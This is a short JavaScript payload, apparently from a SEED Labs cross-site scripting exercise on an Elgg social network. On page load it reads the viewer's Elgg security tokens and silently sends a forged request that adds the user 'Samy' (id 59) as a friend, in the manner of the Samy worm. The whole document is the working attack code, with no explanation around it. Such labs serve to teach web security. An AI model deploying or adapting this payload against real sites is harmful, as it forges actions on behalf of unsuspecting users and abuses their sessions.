<script type="text/javascript">
	window.onload = function () {
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.
		var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET", sendurl, true);
		Ajax.send();
	}
</script>
